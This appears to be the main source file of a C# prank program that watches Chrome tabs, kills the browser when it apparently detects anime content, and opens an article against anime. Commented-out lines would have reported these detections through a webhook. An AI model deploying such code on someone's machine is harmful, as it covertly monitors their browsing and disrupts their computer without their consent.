using System;
using System.Diagnostics;

namespace Anime_Chrome_Crasher
{
    static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            //WeebHook.SendMessage("Weeb detection started");
            FindWindows.Start();
            while (true)
            {
                if (FindWindows.GetChrome())
                {
                    if (FindWindows.CheckTabs())
                    {
                        FindWindows.killWindow("chrome");
                        //WeebHook.SendMessage("WARNING WEEB DETECTED");
                        // Informs the user of why anime is bad!
                        Process.Start("chrome", "http://www.academia.edu/36836619/Why_Anime_Is_Bad_For_You");
                    }
                }
            }
        }
    }
}